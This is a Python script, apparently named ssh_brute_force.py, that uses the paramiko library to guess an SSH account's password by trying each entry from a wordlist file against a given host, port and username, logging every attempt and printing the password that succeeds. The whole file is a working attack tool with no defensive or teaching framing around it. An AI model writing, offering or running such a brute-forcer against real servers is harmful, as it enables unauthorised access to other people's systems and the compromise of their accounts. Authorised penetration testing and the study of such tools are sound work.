import sys
import logging
from getpass import getpass
import paramiko
from colorama import Fore, Style

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def ssh_brute_force(host, port, username, passwords):
    for password in passwords:
        try:
            logging.info(f"Attempting SSH login with password: {password}")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=port, username=username, password=password, timeout=10)
            logging.info(f"Login successful with password: {password}")
            ssh.close()
            return password
        except paramiko.AuthenticationException:
            logging.warning(f"Authentication failed with password: {password}")
        except paramiko.SSHException as e:
            logging.error(f"SSH error: {e}")
        except Exception as e:
            logging.error(f"An unexpected error occurred: {e}")
    logging.error("No valid password found.")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python ssh_brute_force.py host port")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    username = input("Enter your SSH username: ")
    passwords_file = input("Enter the path to the passwords file: ")

    try:
        with open(passwords_file, 'r') as file:
            passwords = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        logging.error("Password file not found.")
        sys.exit(1)

    foundPass = ssh_brute_force(host, port, username, passwords)

    if not foundPass:
        print("Failed to login via SSH.")
    else:
        print(f"{Style.BRIGHT} {Fore.GREEN}SSH login successful. Password: {foundPass} {Style.RESET_ALL}")
